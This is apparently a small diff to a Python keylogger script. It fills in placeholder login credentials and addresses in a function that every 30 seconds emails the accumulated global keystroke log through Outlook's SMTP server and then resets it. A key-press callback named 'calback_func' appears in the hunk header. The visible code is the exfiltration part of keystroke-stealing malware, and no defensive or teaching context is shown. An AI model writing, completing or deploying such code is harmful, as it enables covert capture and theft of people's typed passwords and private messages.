@@ -10,7 +10,7 @@ def Send_mail(alici,gonderen,message):
     mail = smtplib.SMTP("smtp.outlook.office365.com",587)
     mail.ehlo()
     mail.starttls()
-    mail.login("","")
+    mail.login("mail","psw")
     
     mail.sendmail(alici,gonderen,message)
 
@@ -34,7 +34,7 @@ def calback_func(key):
 
 def theading():
     global log
-    Send_mail("","",log.encode("utf-8"))
+    Send_mail("mail","mail",log.encode("utf-8"))
     time = threading.Timer(30,theading)
     log = ""
     time.start()
